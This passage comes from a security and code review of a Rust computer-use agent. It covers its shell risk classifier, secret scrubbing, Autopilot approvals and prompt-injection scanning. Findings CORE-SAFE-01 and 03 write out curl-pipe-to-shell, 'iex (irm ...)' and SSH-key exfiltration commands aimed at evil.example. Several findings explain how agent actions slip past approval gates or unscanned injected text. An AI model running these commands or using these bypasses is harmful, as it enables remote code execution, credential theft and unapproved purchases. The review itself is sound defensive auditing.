- **What:** `HubFile.sha256`/`size` are `Option`, parsed from LFS metadata and copied as-is into `ModelFile`; `ModelEntry::problems()` validates a hash only when present and never requires `size_bytes`. So `kai models pull` can persist an entry with no hash/size, while `hub.rs:6-7` and `docs/MODEL_STORE.md:7` claim every pull is pinned with SHA-256 and exact sizes, and the builtin-catalog test requires both (`mod.rs:397-401`). Installation then verifies only opportunistically (`kai-os/src/local/mod.rs:283-286` prints "no checksum published"; `download.rs:229` skips the check).
- **Evidence:**
  ```rust
  // hub.rs:95-98
  .then(|| HubFile {
      path: path.to_string(),
      size: f["lfs"]["size"].as_u64().or_else(|| f["size"].as_u64()),
      sha256: f["lfs"]["oid"].as_str().map(str::to_ascii_lowercase),
  })
  ```
- **Impact:** a repo/mirror that does not expose LFS metadata silently yields a weaker entry than advertised; corrupt or substituted weights can be installed and run. Commit-pinned https URLs mitigate but do not replace the promised hash check.
- **Fix:** in `entry_from_hub`, `anyhow::ensure!` the chosen model and mmproj files have a 64-hex `sha256` and a `size`; add the same requirement to `problems()` (or a `strict` variant used for pulls). Tests: a tree JSON without `lfs` must be refused; assert a pulled entry passes the same hash/size invariants as builtins.

#### [CORE-CLI-03] settings.json save is not atomic and load silently reverts to defaults
- **Severity:** MEDIUM
- **Location:** `crates/kai-core/src/settings.rs:261-283`
- **What:** `save()` writes `settings.json` in place; a crash mid-write leaves a truncated file. `load()` maps both read and parse errors to `Self::default()` with only a log line, so the next `save()` overwrites the user's file with defaults — losing API keys and endpoint config silently. `Catalog::save_user_entry` (`models/mod.rs:292-313`) already does write-tmp+rename for the same class of file, so the pattern exists in-tree.
- **Evidence:**
  ```rust
  std::fs::write(
      Self::dir().join("settings.json"),
      serde_json::to_string_pretty(self)?,
  )?;
  ```
- **Impact:** silent loss of user configuration and keys on a partial write, or on a hand-edited file that fails to parse; inconsistent durability versus the models catalog.
- **Fix:** write `settings.json.tmp` then `rename`; on parse error, preserve the unreadable file (rename to `.bak`) and refuse to save over it until the user confirms. Tests: save→load roundtrip, and truncate-then-load must not cause the next save to replace the file.

#### [CORE-CLI-04] Gemini thinking config conflicts with DECISIONS.md ("minimal" vs "low")
- **Severity:** LOW
- **Location:** `crates/kai-core/src/client/gemini.rs:121-123` (comment at `:4`), `DECISIONS.md:49-57,130-131`, `docs/HARNESS.md:288`
- **What:** DECISIONS.md records the 2026-10-09 decision to send `thinkingConfig: { thinkingLevel: "low" }` and to remember rejection via a `OnceCell<bool>`; the code sends `"minimal"` and remembers via `AtomicU8`. `docs/HARNESS.md:288` agrees with the code. This is an explicit conflict between the decision log and the shipped behaviour.
- **Evidence:**
  ```rust
  gen_cfg["thinkingConfig"] = serde_json::json!({ "thinkingLevel": "minimal" });
  ```
- **Impact:** the decision log cannot be trusted as a record of what ships; the next reader cannot tell whether "low" was tried and reverted, and a future change may flip behaviour unknowingly.
- **Fix:** update DECISIONS.md to record the revert to "minimal" (with the reason), or change the code if "low" is still intended; extract the level into one named constant so code and docs cite the same value.

#### [CORE-CLI-05] Legacy mapping has unreachable back/forward click arms
- **Severity:** LOW
- **Location:** `crates/kai-core/src/cua/mapping.rs:39-44,68-86`
- **What:** any `click` whose `button` is not `left`/`right` returns `Mapped::Ask("Unsupported native button")` before the match, so the `"back"`/`"forward"` arms can never execute. `docs/COMPUTER_TOOLS.md:64` says back/forward buttons "remain unadvertised", so the arms never reflect real support and cannot be exercised by tests.
- **Evidence:**
  ```rust
  if ty == "click" && !matches!(a["button"].as_str(), Some("left" | "right")) {
      return Mapped::Ask("Unsupported native button".into());
  }
  ```
- **Impact:** dead code that misleads readers into thinking browser back/forward emulation is supported; a future "fix" of the guard would enable an untested path.
- **Fix:** delete the `"back"`/`"forward"` arms (preferred, matching the driver boundary doc); if support is genuinely wanted, remove the blanket refusal as part of a deliberate change and add a `button:"back"` test.

#### [CORE-CLI-06] mapping.rs swallows validate_and_clamp errors
- **Severity:** LOW
- **Location:** `crates/kai-core/src/cua/mapping.rs:12-16` (with `schema.rs:130-187`)
- **What:** `decision()` calls `let _ = d.validate_and_clamp();` and returns `Some(d)` even when validation rejects (`Type` with missing/empty text, `Key` with no keys after filtering, targetless actions). The reply pipeline treats the same failure as invalid (`reply.rs:256`: `d.validate_and_clamp().ok()?`). `map_action` is exported (`cua.rs:10`) but currently has no non-test consumer, so the bug is latent rather than live.
- **Evidence:**
  ```rust
  let mut d: Decision = serde_json::from_value(v).ok()?;
  let _ = d.validate_and_clamp();
  Some(d)
  ```
- **Impact:** an invalid `Decision` can be reported as a valid `Mapped::Act`; if a consumer stops re-validating, execution sees missing required fields.
- **Fix:** use `d.validate_and_clamp().ok()?` so failures take the existing `Mapped::Ask("Invalid native action fields")` path; add a test that `{"type":"type"}` (no text) maps to `Ask`.

#### [CORE-CLI-07] MCP initialize echoes an arbitrary client protocolVersion
- **Severity:** LOW
- **Location:** `crates/kai-core/src/mcp.rs:92-103`
- **What:** the `initialize` reply repeats whatever version the client asked for (falling back to `PROTOCOL`, currently `2025-06-18`), rather than answering with a version Kai supports. A client asking for a newer version is told Kai speaks it, even though Kai's tool schema and semantics are fixed.
- **Evidence:**
  ```rust
  "protocolVersion": params
      .get("protocolVersion")
      .and_then(Value::as_str)
      .unwrap_or(PROTOCOL),
  ```
- **Impact:** an interoperability hazard with future clients; low practical risk today because mainstream clients send the version Kai implements.
- **Fix:** answer `PROTOCOL` (or the min of requested and `PROTOCOL`); add a unit test sending an unknown version and asserting the reply is `PROTOCOL`.

#### [CORE-CLI-08] Settings::dir falls back to a relative path
- **Severity:** LOW
- **Location:** `crates/kai-core/src/settings.rs:224-239`
- **What:** when HOME/XDG_CONFIG_HOME (or APPDATA on Windows) are unset, `unwrap_or_default()` yields an empty `PathBuf`, so config, traces, runs, memory and skills resolve to relative `kai/...` paths in the process CWD. Service managers and containers can run without these variables.
- **Evidence:**
  ```rust
  std::env::var_os("XDG_CONFIG_HOME")
      .map(PathBuf::from)
      .or_else(|| std::env::var_os("HOME").map(|h| PathBuf::from(h).join(".config")))
      .unwrap_or_default()
      .join("kai")
  ```
- **Impact:** config and recorded runs scatter into the working directory, and two different CWDs see different configs, silently.
- **Fix:** return an error or an explicit CWD-derived path with a warning; make `dir()` testable (inject env) and add a test with the variables removed.

#### [CORE-CLI-09] README claims 17 pinned models; catalog has 16
- **Severity:** LOW
- **Location:** `README.md:45`, `crates/kai-core/src/models/catalog.json`
- **What:** the README says "17 pinned, hash-checked models"; parsing `catalog.json` yields 16 entries, all with hashes/sizes. DECISIONS.md:822-825 describes the shelf as 9 + 7 = 16. Either a model was dropped without updating the copy, or one is missing from the catalog.
- **Evidence:**
  ```json
  {"models": [ ... 16 entries: gemma-4-e2b..qwen3.5-9b ... ]}
  ```
- **Impact:** user-visible count mismatch in the headline feature list; undermines the "hash-checked" claim by association.
- **Fix:** update the README to 16 (or add the intended model); confirm with `git log -- crates/kai-core/src/models/catalog.json` whether a pin was removed deliberately.

#### [CORE-CLI-10] Panic paths and TLS-env parity in HTTP client construction
- **Severity:** INFO
- **Location:** `crates/kai-core/src/client/mod.rs:144-159`, `crates/kai-core/src/client/vllm.rs:25-31`, `crates/kai-core/src/client/failover.rs:34-48,85-90`
- **What:** `http_client()` and `VllmClient::new` use `.expect("reqwest client")`, panicking if the builder fails (e.g. broken system TLS config). Failover uses `Mutex::lock().unwrap()`, which panics only after an earlier panic while holding the lock. `VllmClient` also builds its own client without the `SSL_CERT_FILE` extra-roots handling that `http_client()` provides for corporate proxies.
- **Evidence:**
  ```rust
  b.build().expect("reqwest client")           // client/mod.rs:158
  .build().expect("reqwest client")            // client/vllm.rs:31
  self.until.lock().unwrap().map(...)          // client/failover.rs:36-37
  ```
- **Impact:** a startup panic instead of a clear error; corporate TLS setups may work on Gemini/Gateway but fail only against the Droplet.
- **Fix:** return/propagate construction errors (or `expect` with a startup-level message the CLI maps to a friendly error); have `VllmClient` reuse `http_client()` or a shared cert helper.

#### [CORE-CLI-11] No TODO/FIXME/HACK markers in scope; `unreachable!()` is guarded
- **Severity:** INFO
- **Location:** `crates/kai-core/src/cua_protocol.rs:97-106,199`; repo-wide grep of `crates/`
- **What:** grep for `TODO|FIXME|HACK|XXX|todo!|unimplemented!|placeholder` finds no markers in `crates/kai-core` (the only "placeholder" hits are UI text fields in `kai-app` and `kai-cli/src/backend.rs:243 placeholder_client()`, outside this review's scope). The lone `unreachable!()` is genuine: `parse_action` first rejects every `type` not in its whitelist match, so the later match cannot see an unknown value.
- **Evidence:**
  ```rust
  let keys: &[&str] = match ty { ... _ => return Err(ToolError::Unsupported) }; // :97-105
  ...
  _ => unreachable!(),                                                          // :199
  ```
- **Impact:** none; listed only to record the marker sweep.
- **Fix:** none required; optionally parse `type` into a typed enum so the compiler removes the unreachable.

### Not needed / remove

- `cua/mapping.rs:74-81` — the back/forward click arms (unreachable, contradicts the driver boundary doc; CORE-CLI-05).
- `cua/mapping.rs:62` — the duplicate `let ty = a["type"]...` rebinding; reuse the binding from line 22.
- `client/gemini.rs:64` — `json_schema` is initialised with `THINKING_UNKNOWN`; introduce a shared `UNKNOWN` constant or rename, since the value is semantically unrelated to thinking.
- `client/vllm.rs:26-31` — the bespoke reqwest builder; prefer the shared `http_client()` so `SSL_CERT_FILE` and pool settings stay in one place.
- `client/mod.rs:158`, `client/vllm.rs:31` — `.expect("reqwest client")` panic paths; convert to propagated errors if the startup call site can report them.
- `cua_protocol.rs:199` — `unreachable!()` could be removed entirely by parsing `type` into an enum before the match.

### What's good

- `ClientError::from_status` maps "restricted model" 401/403/404 to `Unavailable`, and `FailoverClient` keeps a 365-day "stay on secondary" state for that case, with tests (`client/failover.rs:82-90,161-176`) — thoughtful degradation, not just retry loops.
- `openai.rs` combines a capped Retry-After 429 loop with automatic 400 step-downs for `response_format` and `reasoning_effort`, remembered across calls (`openai.rs:315-346`), and `strictify` correctly marks every property required for OpenAI strict mode.
- Gemini rotates comma-separated keys per attempt and only waits `RetryInfo` once all keys are limited (`gemini.rs:183-236`); retry-and-remember for `thinkingConfig`/`responseJsonSchema` matches the team's guidance.
- `schema.rs::extract_json_object` is quote-aware and brace-balanced with no underflow, and `validate_and_clamp` clamps (thought to 25 words, text to 8192 bytes, scroll amount to 1..MAX) while rejecting only missing required fields; shell keys drop control characters.
- `reply_salvage` refuses to salvage without a complete `risk`, and `web.rs::normalise_url` rejects userinfo/`@`, control characters and non-http(s) schemes, then fences `>>>page` correctly.
- `computer/validate.rs` enforces the documented bounds (8192-byte text, 1–8 valid keys, ±4096 px / 20 notches, waits ≤3000 ms) and `cua_protocol.rs::parse_action` whitelists arguments and caps actions at four per response.
- MCP `kai_act` refuses high-risk/payment/CAPTCHA/shell actions, and the `kai mcp` bridge downgrades Autopilot to `HighRiskOnly` — the approval boundary holds at the tool edge.
- The model store refuses gated, split and text-only repos, uses whole-token quant matching, rejects `../`/malformed refs, pins URLs to a 40-hex commit, and its Hub tests are anchored to real API JSON shapes; `builtin_catalog_is_valid_and_complete` enforces hashes, sizes and memory bounds on every builtin entry.

### Open questions

1. Is `cua::map_action`/`Mapped::Act` still on a shipping path? Grep finds no non-test consumer in `crates/`; if the legacy lane is retired, the module (and its dead arms) should be deleted rather than patched.
2. Is a Droplet 429 considered fatal by policy? DECISIONS.md documents 429 waits only for the Gateway; if the Droplet is expected never to 429, CORE-CLI-01 is still worth fixing for `--backend both` robustness.
3. Which model was the 17th in the README count, and was it removed deliberately (licence/pin failure)? The catalog is internally consistent at 16.
4. DECISIONS.md (thinking `low`, `OnceCell`) versus code and HARNESS.md (thinking `minimal`, `AtomicU8`): which is the source of truth now?
5. Should a corrupt/unreadable `settings.json` surface to the user (onboarding/settings UI) instead of silently reverting to defaults on load?

---

## 3.3 CORE-SAFE — Memory, skills, procedures, risk/safety, audit trail

*Reviewed files: 34. Findings: 1C / 3H / 7M / 4L / 2I.*

Fragment for the Kai swarm review. Scope: `kai-core` memory/skill/procedure/risk/untrusted/ledger/trace/recorder/macro-history/shell-ro/task-checks/ports modules plus the six user-facing docs that make claims about them. Every in-scope file was read in full, line by line. No TODO/FIXME/HACK/placeholder markers exist anywhere in scope (ripgrep over all 28 Rust files and 6 docs: zero hits).

### Scope covered

| File | Lines | Verdict |
|---|---|---|
| `README.md` | 256 | Accurate except the Autopilot payment claim (F04). |
| `docs/MEMORY.md` | 255 | Clear; one factual overclaim about digit runs (F02). |
| `docs/SKILLS.md` | 76 | Matches `skill.rs` behavior. |
| `docs/PROCEDURES.md` | 110 | Matches lifecycle code; binding nuance at F12. |
| `docs/SAFETY.md` | 140 | Strong threat model; "screen before the model sees it" overstated (F09), order-number row at 121 vs effect words (F10). |
| `docs/VERIFICATION.md` | 335 | Claim table consistent with the code I cross-checked; no internal contradictions found. |
| `crates/kai-core/src/memory/mod.rs` | 280 | Clean; id scheme issue F06, hash duplication F15. |
| `crates/kai-core/src/memory/store.rs` | 469 | Solid locking/JSONL/compaction; F06, F17. |
| `crates/kai-core/src/memory/tests_store.rs` | 385 | Strong behavioral coverage. |
| `crates/kai-core/src/memory/tests.rs` | 259 | Strong. |
| `crates/kai-core/src/memory/learn.rs` | 398 | Sound rules; effective only as good as `scrub` (F02). |
| `crates/kai-core/src/memory/recall.rs` | 238 | Solid scoping/ranking; covered by tests. |
| `crates/kai-core/src/memory/reflect.rs` | 149 | Minor scrub omission F07. |
| `crates/kai-core/src/memory/consolidate.rs` | 139 | Sound; depends on traces (F05). |
| `crates/kai-core/src/memory/facts.rs` | 189 | Solid. |
| `crates/kai-core/src/memory/promote.rs` | 112 | Sound; cosmetic dedup note F17. |
| `crates/kai-core/src/memory/scope.rs` | 272 | Solid; one local-host edge F13. |
| `crates/kai-core/src/memory/scrub.rs` | 158 | Good idea, real pattern gaps F02. |
| `crates/kai-core/src/memory/exam.rs` | 96 | Solid. |
| `crates/kai-core/src/skill.rs` | 391 | Solid; minor frontmatter notes F14. |
| `crates/kai-core/src/procedure.rs` | 393 | Conservative lifecycle; substring rebind risk F12. |
| `crates/kai-core/src/procedure_tests.rs` | 233 | Strong. |
| `crates/kai-core/src/risk.rs` | 340 | Core policy sound (secure fields, payments); classifier holes F01/F03/F04/F10. |
| `crates/kai-core/src/risk_tests.rs` | 302 | Broad, but does not test the bypass classes above. |
| `crates/kai-core/src/untrusted.rs` | 383 | Good whole-word matching; detection gaps F08/F09. |
| `crates/kai-core/src/ledger.rs` | 377 | Parser ignores model `status` (good); no tamper evidence F11. |
| `crates/kai-core/src/ledger_tests.rs` | 117 | Solid. |
| `crates/kai-core/src/trace.rs` | 392 | Comprehensive record; retention F11. |
| `crates/kai-core/src/recorder.rs` | 373 | Solid; F11/F15. |
| `crates/kai-core/src/macro_history.rs` | 187 | Sound and small. |
| `crates/kai-core/src/shell_ro.rs` | 331 | Excellent: allowlist, no shell, FORBIDDEN chars, rebuilt PowerShell quoting, ~50-command test. |
| `crates/kai-core/src/task_checks.rs` | 161 | Sound. |
| `crates/kai-core/src/task_checks_tests.rs` | 108 | Solid. |
| `crates/kai-core/src/ports.rs` | 437 | Sound; ports/dedup look correct. |

Totals: 34 files, 8,841 lines.

### Verdict

- Correctness: **7/10** — the secure-field and approval policies are carefully thought through, but the shell classifier and scrubber have concrete false negatives (F01–F04).
- Security: **5/10** — the architecture (typed secrets, privacy pass, gates) is right; the gaps are in the pattern tables that guard the boundary, and one of them (F01) is an approval bypass for remote code execution.
- Maintainability: **7/10** — small, focused modules with clear comments; a few cross-file duplications and doc/code drift (F02, F04, F10, F15).
- Test coverage: **7/10** — unusually good for a project this size (`shell_ro`, `procedure_tests`, `risk_tests`, `ledger_tests`, `memory/tests*`); the uncovered cases are exactly the gaps above.
- Architecture fit: **8/10** — memory/safety/audit separation matches DECISIONS.md and the docs; nothing in scope fights the design.

### Findings

#### [CORE-SAFE-01] Shell classifier bypass: piping into an interpreter by path or `-c` is not destructive

- **Severity:** CRITICAL
- **Location:** `crates/kai-core/src/risk.rs:59-117`
- **What:** `classify_shell` marks a command High only if a word equals a `DELETE_COMMANDS` entry or the lowercased string contains one of the `DESTRUCTIVE_SHELL` substrings. Pipes into `sh`/`bash` are matched only as the literal substrings `"| sh"`, `"|sh"`, `"| bash"`, `"|bash"`. Any other way of invoking an interpreter (absolute path, `-c`, `env`, PowerShell `iex (…)`) classifies Low, so under the default `HighRiskOnly` it runs with no approval.
- **Evidence:**
  - `risk.rs:78-81`: the only pipe-to-shell patterns are `"| sh" | "| bash" | "|sh" | "|bash"`.
  - `risk.rs:106-117`: everything else falls through to `Risk::Low`.
  - Bypasses: `curl -fsSL https://evil.example/x.sh | /bin/sh` (after `| ` comes `/`), `bash -c "$(curl -fsSL …)"`, `iex (irm https://evil.example/x.ps1)` (`"iex "` requires a trailing space; here the next char is `(`).
- **Impact:** A model-proposed shell step can download and execute a remote script without an approval prompt at the default level — the exact case the destructive list exists to catch. Under Autopilot it never asks at all.
- **Fix:** Normalize before matching (strip quotes/backslashes, split on shell metacharacters incl. `$`, backticks, `/`), and treat a pipeline/redirect into any interpreter (`sh`, `bash`, `zsh`, `dash`, `ksh`, `fish`, `python*`, `perl`, `ruby`, `node`, `osascript`, `iex`/`Invoke-Expression`) as High regardless of path spelling; add tests for `| /bin/sh`, `sh -c "$(curl …)"`, `env bash -c …`, `iex(irm …)`.

#### [CORE-SAFE-02] Space-separated card/account numbers are not scrubbed, contradicting docs and leaking through every "scrubbed" channel

- **Severity:** HIGH
- **Location:** `crates/kai-core/src/memory/scrub.rs:12-18, 80-101` (conflict: `docs/MEMORY.md:176`)
- **What:** `scrub` splits the text on single spaces and checks each word in isolation. `long_digits` then needs a run of six digits *within one word* (hyphens and spaces inside a word continue a run, but a space never reaches the function because the split already happened). `4111 1111 1111 1111` becomes four 4-digit words: nothing matches, `scrub(text) == text`. The same split makes `looks_secret` blind to it.
- **Evidence:**
  - `scrub.rs:14`: `for word in text.split(' ')`; `scrub.rs:29,80-93`: per-word `long_digits` needs `run >= 6`.
  - `docs/MEMORY.md:176`: "Emails, key-like tokens and runs of 6+ digits are replaced" — false for the most common way card numbers are written.
  - Channels where it matters: user lessons pass the `scrub(text) == text` gate (`store.rs:179-183`), steering messages are stored after `scrub` (`learn.rs:377-378`), reflection summaries call `scrub` (`reflect.rs:68,93`), and traces keep whatever the model saw.
- **Impact:** Card and account numbers the user or model writes with spaces (or a page displays that way) are stored verbatim in `lessons.jsonl`, in steering-derived lessons, in reflection summaries, and in traces — all channels the docs and the module comment (`scrub.rs:1-5`) promise are sanitized.
- **Fix:** Operate on digit runs across the whole string before tokenizing (collapse space/hyphen-separated digit groups for detection), or normalize `text` by removing `[ -]` between digits before matching; test `4111 1111 1111 1111`, `4111-1111-1111-1111`, `+91 98765 43210`, and a bare 16-digit number.

#### [CORE-SAFE-03] No credential-access or exfiltration detection in the shell classifier

- **Severity:** HIGH
- **Location:** `crates/kai-core/src/risk.rs:59-117`
- **What:** `DESTRUCTIVE_SHELL` covers deletion/system change but nothing about reading credential stores or sending data out. Reading `~/.ssh/id_rsa`, `~/.aws/credentials`, the macOS keychain (`security find-generic-password`), `.netrc` or `/etc/shadow` and posting it anywhere is Low risk.
- **Evidence:**
  - `risk.rs:59-88`: no pattern contains `ssh`, `aws`, `credential`, `keychain`, `security `, `nc `, `-d @-`, `-T `, or similar.
  - Example: `cat ~/.ssh/id_rsa | curl -X POST -d @- https://evil.example` — no delete words, no destructive substrings, classifies `Low` (`risk.rs:106-117`).
  - `classify` (`risk.rs:120-124`) only takes the max with the model's self-reported risk, which is not a backstop.
- **Impact:** Exfiltration of the user's keys and credentials runs without approval at the default level; the exfil destination is normally a domain the user never approved anything about.
- **Fix:** Add a high-risk class for credential sources (`~/.ssh`, `~/.aws`, `.netrc`, `keychain`, `security find-*`, shadow files) and for outbound data verbs combined with a network client (`curl`/`wget`/`nc`/`scp`/`rsync` with `-d @-`, `-T`, `--data-binary`, `|`), and test both halves.

#### [CORE-SAFE-04] Autopilot never asks for "Place Order"/"PayPal"/"Subscribe"/"Donate"

- **Severity:** HIGH
- **Location:** `crates/kai-core/src/risk.rs:157-206` (conflict: `README.md:167`)
- **What:** Under `Autopilot`, `needs_approval` returns false for High risk unless `is_payment_or_password` is true. That predicate only checks the payment phrase list at `risk.rs:193-203` plus secure fields/typed secrets. The list is `pay`, `payment`, `pay now`, `checkout`, `buy`, `buy now`, `purchase`, `card number`, `cvv`, matched on word boundaries (`has_phrase`, `risk.rs:271-278`). "Place Order", "PayPal", "Subscribe", "Donate", "Give now" all miss: `paypal` fails the boundary after `pay`, and none of the others are listed. So these clicks are High risk (via `HIGH_RISK_WORDS` `order`/`subscrib`) but High is ignored on Autopilot.
- **Evidence:**
  - `risk.rs:157-167`: Autopilot branch returns `false` when `is_payment_or_password` is false.
  - `risk.rs:193-203`: phrase list has no order/PayPal/subscribe/donate entry.
  - `risk.rs:272-277`: `has_phrase` requires a non-alphanumeric after the phrase, so `"paypal"` does not contain `"pay"` as a phrase.
  - `README.md:167`: "Autopilot still always asks for payments" — true only for the narrow phrase list.
- **Impact:** On Autopilot, a model strike on "Place Order" completes a purchase with no prompt. The README promises otherwise, so users may rely on an approval that never appears.
- **Fix:** Extend the payment list (`place order`, `order now`, `paypal`, `subscribe`, `donate`, `give`, `tip`, `add payment`, `top up`, `recharge`) and/or treat any `HIGH_RISK_WORDS` match on a click whose element is a button in a checkout-ish flow as payment; add a test asserting `needs_approval(Autopilot, High, /*is_payment*/ true)` fires for "Place Order".

#### [CORE-SAFE-05] `kai run --no-memory` still writes full traces, and consolidation harvests them

- **Severity:** MEDIUM
- **Location:** `crates/kai-cli/src/main.rs:482`, `crates/kai-cli/src/memory.rs:143-145`
- **What:** The trace is saved unconditionally after every run; nothing consults a no-memory/opt-out flag at that call site. `kai memory consolidate` then reads every trace under `Settings::traces_dir()` and proposes lessons from them, including runs the user asked not to remember.
- **Evidence:**
  - `main.rs:482`: `memory::save_trace(&trace);` straight after the engine call, no guard.
  - `memory.rs:144-145`: `let traces = saved_traces(&Settings::traces_dir()); let found = consolidate::propose(&traces, &s.lessons());`.
  - The settings struct does carry the memory toggle elsewhere, but the trace path ignores it.
- **Impact:** "Don't remember this run" only disables live learning; the run's steps/screens still land on disk and can resurface as lessons later. A privacy opt-out that doesn't opt out.
- **Fix:** Either skip `save_trace` (or write a reduced trace) when memory is off, or record a "no-learn" marker per trace and have `saved_traces`/`consolidate` filter it out; document the traces-vs-lessons split in `docs/MEMORY.md`.

#### [CORE-SAFE-06] Lesson ids can collide; one lesson silently replaces another on reload and becomes un-forgettable

- **Severity:** MEDIUM
- **Location:** `crates/kai-core/src/memory/mod.rs:171-191`, `crates/kai-core/src/memory/store.rs:70-77, 186-198, 369-411`
- **What:** `Lesson::new` builds the id from `fnv1a("{text}|{now}")` truncated to 32 bits, where `now` is Unix seconds. Two lessons with the same text created in the same second (e.g., the same phrase learned as `Avoid` and `Prefer` in one run, or a user lesson added right after a learned one) get the same id. `insert` only merges same-kind near-duplicates, so both survive in memory; the JSONL then has duplicate ids, and `load` keeps only the last (silent overwrite). `forget` refuses when a prefix matches more than one lesson, so the survivor can't be deleted by the user while the duplicate remains.
- **Evidence:**
  - `mod.rs:173-177`: `format!("{:08x}", fnv1a(&format!("{text}|{now}")) as u32)` — 32-bit, second resolution.
  - `store.rs:73-76`: `Some(x) => *x = l` — last line wins on reload.
  - `store.rs:372-380`: the duplicate scan filters `x.kind == l.kind`.
  - `store.rs:190-197`: `hits.len() != 1` → `Ok(false)`.
- **Impact:** A lesson can vanish after a restart with no warning, and a user cannot forget the ambiguous twin. Rare but permanent when it happens; erodes trust in "what I taught Kai stays".
- **Fix:** Make ids globally unique (mix kind + a monotonic counter + full 64-bit hex, or a random suffix), and have `load` merge same-id records deterministically (e.g., union evidence, keep user source) instead of last-wins; add a test for same-text same-second different-kind lessons.

#### [CORE-SAFE-07] Reflection summaries embed unscrubbed command output

- **Severity:** MEDIUM
- **Location:** `crates/kai-core/src/memory/reflect.rs:81-94`
- **What:** For a failed step, the summary's `result` is the last line of the step's output, truncated to 80 chars but never passed through `scrub`, then formatted into the summary that is sent to the reflection model call (and kept in logs). The other parts of the summary (`learn::what(st)` at :93, `f.detail` at :68) are scrubbed.
- **Evidence:**
  - `reflect.rs:81-84`: `let last = out.lines().last()…; format!("FAILED {}", …)`.
  - `reflect.rs:90-94`: `s.push_str(&format!("{}. {}{app} -> {result}\n", st.index, scrub(&line)))` — only `line` is scrubbed, `result` is not.
  - Reached via `engine/memory.rs:80-81` (`reflect` when enabled) and `reflect::summary` directly.
- **Impact:** Secrets a shell command printed (tokens in error messages are common) reach a second model provider call despite the stated rule that traces are sanitized before learning. Reflection is off by default, which limits exposure.
- **Fix:** `scrub` the `result` (or `last`) before formatting, and add a unit test with a token-looking last line.

#### [CORE-SAFE-08] `untrusted::sensitive` misses lowercase keys/IBANs and flags plain hashes

- **Severity:** MEDIUM
- **Location:** `crates/kai-core/src/untrusted.rs:117-140, 238-246, 260-285`
- **What:** The private-key check is an exact, case-sensitive `contains("-----BEGIN") && contains("PRIVATE KEY")`, so a lowercase `-----begin openssh private key-----` is not detected. `is_iban` requires the first two bytes to be ASCII uppercase, so a lowercase IBAN (people paste these) is missed. Meanwhile `is_secret_token` treats any 32+-char letters-and-digits token as an API key, so commit hashes and long identifiers trigger the sensitive-data approval path whenever they're typed.
- **Evidence:**
  - `untrusted.rs:119-121`: uppercase literal `"-----BEGIN"`/`"PRIVATE KEY"`.
  - `untrusted.rs:241`: `b[..2].iter().all(u8::is_ascii_uppercase)`.
  - `untrusted.rs:260-261` (doc comment): "a known key prefix, or 32+ characters mixing letters and digits with no spaces" — a 40-hex commit id with at least one letter satisfies this.
- **Impact:** Lowercase-formatted secrets typed into a field do not warn "you are about to send a private key/IBAN"; benign hashes produce approval friction, training users to click through sensitive-data prompts.
- **Fix:** Case-fold the BEGIN PRIVATE KEY check, uppercase-normalize before `is_iban`, and narrow the generic token rule (e.g., require a known prefix, or letters+digits with no vowel-less pattern; exempt pure-hex strings of standard lengths).

#### [CORE-SAFE-09] Injection scanning cannot see static screen text or shell output; SAFETY.md overstates coverage

- **Severity:** MEDIUM
- **Location:** `crates/kai-core/src/untrusted.rs:77-102`, `crates/kai-os/src/a11y/mod.rs:115-117,206`, `crates/kai-os/src/a11y/macos_roles.rs:103`, `crates/kai-core/src/prompt.rs:187-194`, conflict `docs/SAFETY.md:16`
- **What:** `suspicious` scans only `Grounding::Marks` (name/value of elements that made it into the grounding). On macOS the a11y reader filters out non-interactive roles — `"AXStaticText"` maps to `Role::Other` and `interactive()` excludes it — so a page's static text (where a phishing banner or an injection lives in a browser) never reaches the scanner. Separately, shell/terminal output is attached to the next model prompt (`push_output` → `output:` block) with no untrusted-content scan at all.
- **Evidence:**
  - `untrusted.rs:77-83`: only iterates `Grounding::Marks` elements and their `name`/`value`.
  - `macos_roles.rs:103`: `"AXStaticText" => Role::Other`; `a11y/mod.rs:115-117` `interactive` = `!matches!(role, Role::Other | Role::Image)`; `:206` filters by it.
  - `prompt.rs:187-194` renders captured `output` into the model context; nothing calls `suspicious_text` on it.
  - `docs/SAFETY.md:16`: text is scanned "before the model sees it".
- **Impact:** A browser page can carry a visible injection/phishing string that Kai's check never examines; terminal output can carry instructions that flow straight into the model. The doc claim invites users to trust a check that doesn't cover these surfaces.
- **Fix:** Feed window/page text into `suspicious_text` per step (the function already exists for the browser lane), scan `output` before `push_output` attaches it (or flag matches as a human check), and soften `SAFETY.md:16` to state the actual coverage ("every element Kai can act on" + page text where available).

#### [CORE-SAFE-10] Effect-word matching escalates innocuous fields ("Order number", "Postcode")

- **Severity:** MEDIUM
- **Location:** `crates/kai-core/src/risk.rs:29-56, 139-150, 237-254` (context: `docs/SAFETY.md:121`)
- **What:** `starts_word` checks only the character *before* a match, not the character after. So any word *starting* with `order`, `post`, `send`, `format`, `eras`, etc. counts — "Postcode" matches `post`, "Order number" matches `order` — and typing into such a field is High risk, which means an approval prompt at the default level for ordinary e-commerce/logistics fields. `docs/SAFETY.md:121` lists order numbers among the things that are *not* sensitive.
- **Evidence:**
  - `risk.rs:243-253`: `hay.match_indices(prefix)` with only the preceding word checked (`after` is never examined).
  - `risk.rs:36`: `"order"` in `HIGH_RISK_WORDS`; `risk.rs:55`: `"post"`.
  - `risk.rs:143-149`: non-inert steps matching a word return `Risk::High`; `needs_approval` asks for High at `HighRiskOnly`.
- **Impact:** Routine typing (tracking numbers, postal codes) triggers approval dialogs, the classic alert-fatigue failure mode that makes users stop reading prompts — especially dangerous given F03/F04 where a real payment/exfil prompt can hide among them.
- **Fix:** In `starts_word`, also require the next character to be non-alphanumeric or an accepted suffix end ("deleting" must still match, "postcode" must not); alternatively drop overly generic words (`order`, `post`, `format`) to whole-word matching and cover the specific risky phrases ("place order", "publish post").

#### [CORE-SAFE-11] Audit trail grows without bound, has no purge, and "Delete all history" leaves derived lessons

- **Severity:** MEDIUM
- **Location:** `crates/kai-core/src/recorder.rs:1-120`, `crates/kai-core/src/trace.rs:230-260`, `crates/kai-core/src/ledger.rs:1-120`, `crates/kai-app/src/pages/settings.rs:250-262`
- **What:** Every `kai run` writes a full trace directory (screenshots included) under `traces_dir` with no retention limit, size cap, or `kai` CLI purge command. The app's "Delete all history" dialog removes only `traces_dir`; `lessons.jsonl` (and the plan cache) survive. The ledger and traces are plain JSON/JSONL with no hash chain or seal, so nothing detects later edits.
- **Evidence:**
  - `main.rs:482` (kai-cli): `save_trace` on every run; recorder writes the run's screenshots alongside (README "screenshots are removed").
  - `settings.rs:256`: `std::fs::remove_dir_all(Settings::traces_dir())` — nothing touches the memory store.
